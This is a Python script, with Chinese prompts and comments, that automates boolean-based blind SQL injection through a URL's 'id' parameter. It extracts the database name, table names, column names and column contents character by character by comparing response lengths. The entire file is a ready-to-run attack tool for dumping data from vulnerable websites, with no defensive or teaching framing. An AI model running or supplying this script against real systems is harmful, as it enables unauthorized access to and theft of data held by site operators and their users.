
import requests
import string


def Bool_inject(url):

    print("检测正常页面返回长度…………")
    normalHtmlLen = len(requests.get(url=url + "?id=1").text)

    print("正常返回HTML长度为:" + str(normalHtmlLen))

    database_Name_Len = 0

    print("开始检测当前数据库名长度…………")
    while True:
        test_url = url + "?id=1'+and+length(database())=" + str(database_Name_Len) + "--+"
        print("尝试长度："+str(database_Name_Len)+"……")

        if len(requests.get(test_url).text) == normalHtmlLen:
            print("The len of database_Name:" + str(database_Name_Len)+"")
            break

        if database_Name_Len == 30:
            print("Error!")
            break

        database_Name_Len += 1

    # 爆破数据库名
    print("开始爆破数据库名……")
    database_name = ""

    for i in range(1, database_Name_Len + 1):
        for a in string.ascii_lowercase:
            dbName_url = url + "?id=1'+and+substr(database()," + str(i) + ",1)='" + a + "'--+"
            if len(requests.get(dbName_url).text) == normalHtmlLen:
                database_name += a
                print(database_name)
                break
    print("数据库名为" + database_name+"")
    database_to_dump = input("请输入需要爆破的数据库名：")

    print("开始爆破表……")
    # 爆破表
    table_name = ''
    for i in range(1, 30):
        for a in string.ascii_lowercase:
            dbName_url = url + "?id=1'+and+substr((select group_concat(table_name) from information_schema.tables where " \
                               "table_schema='" + database_to_dump + "')," + str(i) + ",1)='" + a + "'--+ "

            if len(requests.get(dbName_url).text) == normalHtmlLen:
                table_name += a
                print(table_name)
                break
            else:
                b = ','
                dbName_url = url + "?id=1'+and+substr((select group_concat(table_name) from information_schema.tables " \
                                   "where table_schema='" + database_to_dump + "')," + str(i) + ",1)='" + b + "'--+ "
                if len(requests.get(dbName_url).text) == normalHtmlLen:
                    table_name += b
                    print(table_name)
                    break

    table_to_dump = str(input("请输入需要爆破的表："))

    print("开始爆破列：")
    # 爆破列

    column_names = ''

    for i in range(1, 21):
        for a in string.ascii_lowercase:
            dbName_url = url + "?id=1'+and+substr((select group_concat(column_name) from information_schema.columns where " \
                               "table_name='" + table_to_dump + "')," + str(i) + ",1)='" + a + "'--+ "
            if len(requests.get(dbName_url).text) == normalHtmlLen:
                column_names += a
                print(column_names)
                break
            else:
                b = ','
                dbName_url = url + "?id=1'+and+substr((select group_concat(column_name) from information_schema.columns " \
                                   "where table_name='" + table_to_dump + "')," + str(i) + ",1)='" + b + "'--+ "
                if len(requests.get(dbName_url).text) == normalHtmlLen:
                    column_names += b
                    print(column_names)
                    break

    while True:
        column_to_dump = str(input("请输入需要爆破的列："))
        data = ''

        for i in range(1, 100):
            for a in string.ascii_lowercase:
                dbName_url = url + "?id=1'+and+substr((select group_concat(" + column_to_dump + ") from '" + table_to_dump + "')," + str(
                    i) + ",1)='" + a + "'--+ "
                if len(requests.get(dbName_url).text) == normalHtmlLen:
                    data += a
                    print(data)
                    break
                else:
                    b = ','
                    dbName_url = url + "?id=1'+and+substr((select group_concat(" + column_to_dump + ") from '" + table_to_dump + "')," + str(
                        i) + ",1)='" + b + "'--+ "
                    if len(requests.get(dbName_url).text) == normalHtmlLen:
                        data += b
                        print(data)
                        break
        yes_no = input("…………是否继续使用？   Y->是   N->否\n")
        if yes_no == "N" or yes_no == "n":
            break
    print('  感谢使用本程序^_^')
